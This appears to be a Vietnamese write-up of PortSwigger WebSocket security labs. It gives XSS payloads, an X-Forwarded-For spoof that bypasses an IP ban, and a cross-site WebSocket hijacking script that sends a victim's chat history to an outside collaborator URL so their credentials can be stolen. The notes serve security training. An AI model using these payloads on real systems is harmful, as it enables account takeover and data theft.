---
layout: post
title: "WebSockets"
render_with_liquid: false
categories:
  - PortSwigger
tags:
  - portswigger
  - websockets
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Client-side

Payload ở phía client được encode html rồi mới gửi tới server, dẫn đến khi trả về cũng là encode html nên không gây ra XSS

![image.png](/assets/img/portswigger/websockets/image.png)

![image.png](/assets/img/portswigger/websockets/image%201.png)

Khi repeat lại và gửi payload trực tiếp đến server, thì server không validate input nên bị xss

![image.png](/assets/img/portswigger/websockets/image%202.png)

![image.png](/assets/img/portswigger/websockets/image%203.png)

1. Nhấp vào "live chat" và gửi tin nhắn trò chuyện. 
2. Trong Burp Proxy, hãy chuyển đến tab WebSockets history và quan sát rằng tin nhắn trò chuyện đã được gửi qua WebSocket message.
3. Nhấp chuột phải vào tin nhắn và chọn Send to Repeater
4. Chỉnh sửa và gửi lại tin nhắn có chứa tải trọng XSS cơ bản, chẳng hạn như:
    
    ```bash
    <img src=1 onerror='alert(1)'>
    ```
    
5. Quan sát rằng cuộc tấn công đã bị chặn và kết nối WebSocket của bạn đã bị chấm dứt.
6. Nhấp vào "Reconnect" và quan sát thấy rằng nỗ lực kết nối không thành công vì địa chỉ IP của bạn đã bị cấm.
7. Thêm tiêu đề sau vào yêu cầu bắt tay để giả mạo địa chỉ IP của bạn:
    
    ```bash
    X-Forwarded-For: 1.1.1.1
    ```
    
    ![image.png](/assets/img/portswigger/websockets/378aeeae-661a-4fc4-8128-5ab4e8e6ecf6.png)
    
8. Nhấp vào "Connect" để kết nối lại thành công WebSocket.
9. Gửi tin nhắn WebSocket chứa tải trọng XSS bị xáo trộn, chẳng hạn như:
    
    ```bash
    <iMg src=1 oNeRrOr=alert`1`>
    ```
    

**What is cross-site WebSocket hijacking?**

Cross-site WebSocket hijacking liên quan đến lỗ hổng csrf, nó xảy ra khi yêu cầu WebSocket handshake không chứa bất kể CSRF token hoặc một mã không thể đoán

Attacker có thể tạo 1 trang web độc hại trên domain của họ sau đó thiết lập 1 kết nối WebSocket đến ứng dụng có lỗ hổng. Ứng dụng sẽ xử lý kết nối trong bối cảnh phiên làm việc của người dùng nạn nhân với ứng dụng

Một cuộc cross-site WebSocket hijacking thành công cho phép attacker làm được 2 điều sau:

- Thực hiện các hành động trái phép giả dạng là người dùng nạn nhân: nếu ứng dụng thực hiện các chức năng nhạy cảm dựa trên message của client gửi lên để điều khiển ứng dụng
- Gửi tin nhắn WebSocket để truy xuất dữ liệu nhạy cảm.
- Truy xuất dữ liệu nhạy cảm của người dùng trong đoạn chat, Nếu ứng dụng sử dụng tin nhắn WebSocket do máy chủ tạo ra để trả về bất kỳ dữ liệu nhạy cảm nào cho người dùng sau đó kẻ tấn công có thể chặn những tin nhắn đó và lấy cắp dữ liệu của người dùng nạn nhân.

Ví dụ WebSocket handshake sau đây bị lỗ hổng CSRF vì session token là duy nhất được truyền trong cookie:

```bash
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

&gt; NOTE:
`Sec-WebSocket-Key` chứa giá trị ngẫu nhiên để ngăn ngừa lỗi từ caching proxy và không được sử dụng cho mục đích authentication hoặc xử lý phiên.
&gt; 
1. Nhấp vào **"Live chat"** và gửi một tin nhắn trò chuyện.
2. Tải lại trang.
3. Trong Burp Proxy, tại tab **WebSockets history** (Lịch sử WebSockets), hãy quan sát rằng lệnh "READY" truy xuất các tin nhắn trò chuyện đã qua từ máy chủ.
4. Trong Burp Proxy, tại tab **HTTP history** (Lịch sử HTTP), tìm yêu cầu bắt tay WebSocket (WebSocket handshake). Quan sát thấy yêu cầu này không có mã thông báo CSRF (CSRF tokens).
5. Nhấp chuột phải vào yêu cầu bắt tay và chọn **"Copy URL"** (Sao chép URL).
6. Trong trình duyệt, đi đến máy chủ khai thác (exploit server) và dán mẫu sau vào phần **"Body"** (Nội dung):codeHtml
    
    ```bash
    <script>
        var ws = new WebSocket('wss://your-websocket-url');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>
    ```
    
7. Quay lại máy chủ khai thác và **deliver the exploit to the victim** (gửi mã khai thác đến nạn nhân).
8. Thăm dò lại các tương tác trong tab Collaborator. Quan sát rằng bạn đã nhận được thêm các tương tác HTTP chứa lịch sử trò chuyện của nạn nhân. Kiểm tra các tin nhắn và để ý rằng một trong số chúng chứa tên người dùng và mật khẩu của nạn nhân.
    
    ![image.png](/assets/img/portswigger/websockets/image%204.png)
    
9. Sử dụng thông tin đăng nhập đã bị rút trích để đăng nhập vào tài khoản của người dùng nạn nhân.
